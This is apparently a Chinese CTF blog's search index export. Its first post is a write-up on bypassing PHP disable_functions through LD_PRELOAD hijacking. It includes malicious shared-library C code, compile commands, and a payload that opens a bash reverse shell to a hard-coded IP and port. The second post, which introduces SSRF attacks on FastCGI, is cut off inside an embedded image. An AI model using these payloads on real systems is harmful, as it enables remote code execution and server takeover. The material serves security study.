<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LD_PRELOAD</title>
      <link href="/2025/12/16/LD-PRELOAD/"/>
      <url>/2025/12/16/LD-PRELOAD/</url>
      
        <content type="html"><![CDATA[<p>M申给我发了两道题，其中一道就是关于LD_PRELOAD的，之前面vn的时候，infer问了我相关的问题没答上来，正好学习一下</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(__FILE__);if(isset($_POST['context'])){  $context = $_POST['context'];  file_put_contents("1.txt",base64_decode($context));}if(isset($_POST['env'])){  $env = $_POST['env'];  putenv($env);}system("nohup wget --content-disposition -N hhhh &");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="oAIQc">引入</h1><p>LD_PRELOAD(预加载)本身是Linux中的环境变量，用于指定动态库的加载地址。</p><p>在Linux程序中，一个程序调用时动态库的加载优先级最高，当LD_PRELOAD变量指定的地址为恶意链接库时，该链接库的调用则会造成危害。我们自己编写的库文件需要保证自定义替换的函数与原函数相同，包括类型和参数</p><h1 id="GqNba">劫持系统函数绕过disable_functions</h1><p>当系统试图调用某函数时，该函数位于特定的共享库(xxx.so)，因此，系统在调用之前将加载xxx.so，换句话说，如果我可以创建一个evil.so有了同名的函数，就能将其覆盖之。  </p><p>为了彻底搞明白我们正一个简单的php，流程是编写恶意so -&gt; 通过putenv来设置LD_PRELOAD变量 -&gt; 触发wget函数来调用我们编写的恶意so  </p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phpputenv("LD_PRELOAD=./evil.so");system("nohup wget --content-disposition -N hhhh &");?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们追踪system</p><p>:::tips<br>strace -f php system.php 2&gt;&amp;1 | grep execve   </p><p>:::</p><p>可以看到就是我们预想的调用了wget</p><p>再追踪wget</p><p>:::tips<br>strace wget 2&gt;&amp;1</p><p>readelf -Ws /usr/bin/wget</p><p>#查看wget命令使用了哪些库函数  </p><p>:::</p><p>发现存在getuid()能函数，我们就选择getuid</p><pre class="line-numbers language-language-c"><code class="language-language-c">#include <stdlib.h>#include <stdio.h>#include <string.h>void payload() {    system("echo sussess > res");}int getuid(){    if (getenv("LD_PRELOAD") == NULL) { return 0; }    unsetenv("LD_PRELOAD");    payload();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><p>:::tips<br>gcc -fPIC -shared -o evil.so ld.c -ldl</p><p>:::</p><p>再运行查看是否执行</p><p>:::tips<br>php system.php</p><p>cat res</p><p>:::</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52815563/1761710115065-b8346f38-3f02-4cbd-90fa-d6efed6cba36.png"></p><p>最终成功执行</p><h1 id="TXGzp">劫持共享库</h1><p> <strong>attribute</strong> 是 GNU C 里一种特殊的语法，语法格式为：<strong>attribute</strong> ((attribute-list))，若函数被设定为constructor属性，则该函数会在main()函数执行之前被自动的执行，类似的，若函数被设定为destructor属性，则该函数会在main()函数执行之后或者exit()被调用后被自动的执行，比如</p><pre class="line-numbers language-language-c"><code class="language-language-c">// 库加载时自动执行该函数__attribute__((constructor)) void preload_init() {    printf("evil.so 被加载了！\n");    system("echo 自动执行 > res"); // 无需依赖符号冲突，直接执行}// 程序退出时执行__attribute__((destructor)) void preload_exit() {    printf("程序要退出了...\n");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作用有点类似php的那两个魔术方法，其他的这里就先不提</p><p>那么思路就很清晰__attribute__((constructor)) 在加载共享库时就会运行，只要编写一个含__attribute__((constructor)) 函数的共享库，然后在PHP中设置LD_PRELOAD环境变量，并且有一个能 fork 一个子进程并触发加载共享库的函数被执行，那么就能执行任意代码  </p><details class="lake-collapse"><summary id="ue8fc2a28"><span class="ne-text">这里放一些相关的函数</span></summary><h6 id="vGiUD"><span class="ne-text">一、直接创建子进程（</span><code class="ne-code"><span class="ne-text">fork</span></code><span class="ne-text"> 相关）</span></h6><p id="u3b9be181" class="ne-p"><code class="ne-code"><span class="ne-text">fork()</span></code></p><p id="u029241ca" class="ne-p"><code class="ne-code"><span class="ne-text">vfork()</span></code></p><h6 id="MsKBc"><span class="ne-text">二、加载新程序（</span><code class="ne-code"><span class="ne-text">exec</span></code><span class="ne-text"> 系列）</span></h6><p id="ufe26a706" class="ne-p"><code class="ne-code"><strong><span class="ne-text">execve(path, argv, envp)</span></strong></code><span class="ne-text">（系统调用）  </span></p><p id="u2476d1c2" class="ne-p"><code class="ne-code"><strong><span class="ne-text">execl(path, arg0, arg1, ..., NULL)</span></strong></code></p><p id="u9f4753d4" class="ne-p"><code class="ne-code"><strong><span class="ne-text">execvp(file, argv)</span></strong></code></p><h6 id="GYr1U"><span class="ne-text">三、创建线程（间接影响共享库）</span></h6><p id="u2541fe15" class="ne-p"><code class="ne-code"><strong><span class="ne-text">pthread_create()</span></strong></code></p><h6 id="Xf5Sa"><span class="ne-text">四、显式加载共享库的函数</span></h6><p id="u3cc90108" class="ne-p"><code class="ne-code"><strong><span class="ne-text">dlopen(const char *filename, int flag)</span></strong></code></p><p id="u576186ff" class="ne-p"><code class="ne-code"><strong><span class="ne-text">system(const char *command)</span></strong></code></p></details><p>:::tips<br>总结：触发共享库加载的关键场景</p><ol><li><code>**exec**</code>** 系列函数**：替换进程时加载新程序的依赖库，是最主要的触发方式（依赖动态链接器）。</li><li><code>**system**</code>** 函数**：内部通过 <code>fork+exec</code> 执行命令，间接触发子进程的库加载。</li><li><code>**dlopen**</code>** 函数**：显式在当前进程（或子进程）中加载共享库。</li></ol><p>:::</p><p>这里放一道M申给的题目</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(__FILE__);if(isset($_POST['context'])){  $context = $_POST['context'];  file_put_contents("1.txt",base64_decode($context));}if(isset($_POST['env'])){  $env = $_POST['env'];  putenv($env);}system("nohup wget --content-disposition -N hhhh &");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-language-c"><code class="language-language-c">#include <stdlib.h>#include <stdio.h>#include <string.h>void payload() {    system("bash -c 'bash -i >& /dev/tcp/8.138.195.149/7777 0>&1'");}__attribute__((constructor)) void preload (void){    if (getenv("LD_PRELOAD") == NULL) { return 0; }    unsetenv("LD_PRELOAD");    payload();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>劫持系统函数应该也能通，当然也有可能是我本地有问题</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF打Fastcgi</title>
      <link href="/2025/05/09/SSRF%E6%89%93Fastcgi/"/>
      <url>/2025/05/09/SSRF%E6%89%93Fastcgi/</url>
      
        <content type="html"><![CDATA[<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a><strong>FastCGI协议</strong></h3><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h6><p>Fast <a href="https://so.csdn.net/so/search?q=CGI&amp;spm=1001.2101.3001.7020">CGI</a>源自旧版本的CGI，旧版本的CGI性能低下，无法应用在高并发的场景，FastCGI应运而生</p><p>路由/结构图</p><pre class="line-numbers language-language-shell"><code class="language-language-shell"># 访问url --> 浏览器生成HTTP请求报文 --> web server解析请求（例如nginx）当访问index.php时，web server 会把HTTP请求转换为FastCGI请求# -->  转换为FastCGI协议格式并发送给解析器，这里以php为例# --> 发送至php-fpm    process managerphp-fpm接收到请求后，把请求分配给一个worker，worker就是一个解析服务的进程（一直运行），worker根据请求信息，解析php，返回页面例如，招新平台运行了15个worker，（不考虑nginx处理时间）同时可以处理15个请求# --> php-fpm解析并响应<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新旧对比</p><p>​    <img src="data:image/png;base64,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